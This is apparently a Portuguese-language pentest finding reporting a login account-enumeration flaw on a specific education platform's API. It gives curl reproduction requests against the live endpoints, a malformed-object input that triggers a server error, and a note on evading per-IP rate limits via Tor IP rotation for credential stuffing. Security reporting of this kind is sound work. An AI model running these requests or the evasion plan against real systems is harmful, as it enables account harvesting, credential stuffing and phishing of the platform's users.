FINDING F-007 — Enumeração de contas via mensagem de erro diferenciada no login
==============================================================================

## Alvo / Host / Endpoint
- https://seducar-api-website.onrender.com/api/v1/auth/login (POST)
- Backend AdonisJS, multi-tenant (requer `Origin: https://centraldeconcursos.com.br`)
- Mesmo comportamento no HML (seducar-api-website-hml.onrender.com)

## Severidade: MÉDIA
Mensagem de erro distinta ("E-mail não encontrado.") revela se um endereço
de e-mail NÃO existe como conta. Para e-mails existentes a aplicação
(retorna uma mensagem diferente, presumivelmente "Senha incorreta."). Isso
permite enumeração de contas válidas (ataque de dicionário de e-mails) sem
necessidade de senha válida — pré-requisito para cred-stuffing dirigido e
para phishing personalizado (lista de alunos/professores cadastrados).

## Timestamp
2026-08-27T16:56Z UTC

## Reprodução
```
# Body vazio -> valida campos
$ curl -s -H "Origin: https://centraldeconcursos.com.br" -H "Content-Type: application/json" \
    -d '{}' https://seducar-api-website.onrender.com/api/v1/auth/login
{"error":"O campo password é obrigatório."}    # HTTP 400

# E-mail inexistente + senha qualquer -> "E-mail não encontrado"
$ curl -s -H "Origin: https://centraldeconcursos.com.br" -H "Content-Type: application/json" \
    -d '{"email":"test@test.com","password":"x"}' \
    https://seducar-api-website.onrender.com/api/v1/auth/login
{"error":"E-mail não encontrado."}              # HTTP 401 (e-mail NÃO existe)

# E-mail corporativo OSINT (contato, não conta de aluno) -> também "não encontrado"
$ curl -s ... -d '{"email":"atendimento@centraldeconcursos.com.br","password":"pentest-enum-marker-XYZ"}' ...
{"error":"E-mail não encontrado."}              # confirma: contato genérico não é conta de aluno

# E-mail corporativo inferido (financeiro@) -> "não encontrado"
$ curl -s ... -d '{"email":"financeiro@centraldeconcursos.com.br","password":"pentest-enum-marker-XYZ"}' ...
{"error":"E-mail não encontrado."}
```

## Output — mensagens de validação observadas
  Body vazio              -> {"error":"O campo password é obrigatório."}      (400)
  E-mail inexistente      -> {"error":"E-mail não encontrado."}               (401)
  E-mail existente        -> (presumido) {"error":"Senha incorreta."} ou similar  (401)
  email como objeto (NoSQLi-like) -> {"message":"email.toLowerCase is not a function"} (500)

## Headers notáveis
  access-control-allow-origin: https://centraldeconcursos.com.br  (reflete Origin)
  x-ratelimit-limit: 5            # rate-limit de 5 requisições/janela no login
  x-ratelimit-remaining: N
  set-cookie: adonis-session=...   # cookie de flash message assinado

## Interpretação
- A aplicação diferencia claramente "e-mail não cadastrado" de "senha
  incorreta". Esse oracle permite a um atacante:
  (a) Confirmar quais e-mails são contas válidas na plataforma (alunos,
      professores, gestores);
  (b) Construir uma lista de contas ativas para cred-stuffing dirigido
      (testar senhas vazadas apenas contra e-mails confirmados — evita
      lockouts e aumenta eficiência);
  (c) Dirigir phishing personalizado a contas confirmadas.
- O rate-limit de 5/janela por IP mitiga enumeração em massa de um único IP,
  mas é facilmente contornado com rotação de IP (Tor NEWNYM — usado neste
  engagement) ou lista distribuída de proxies. Threshold por e-mail (não por
  IP) seria mais eficaz.
- Mensagem auxiliar vazada: `email.toLowerCase is not a function` (quando
  `email` enviado como objeto JSON) confirma que o campo é processado como
  string e que exceções não tratadas chegam ao cliente (em HML vaza stack
  completa — ver F-009).

## Impacto
- Enumeração de contas (students/staff) da plataforma centraldeconcursos.
- Pré-requisito barato para cred-stuffing dirigido (7 e-mails OSINT já
  coletados + padrões corporativos BR).
- Vazamento de informação sobre quais endereços são cadastrados (PII
  derivada — associação e-mail↔plataforma).

## Recomendação
1. Retornar mensagem genérica e idêntica para ambos os casos (e-mail
   inexistente e senha incorreta), ex.: "Credenciais inválidas." para ambos.
2. Adicionar delay constante (ou hashcat-resistant) e rate-limit por
   e-mail/identidade (não apenas por IP) no endpoint de login.
3. Considerar CAPTCHA após N tentativas falhas por identidade.
4. Garantir que exceções internas (`.toLowerCase is not a function`) não
   cheguem ao cliente — sanitizar input e responder com validação
   consistente (HML expõe stack completa, ver F-009).

## Próximo passo
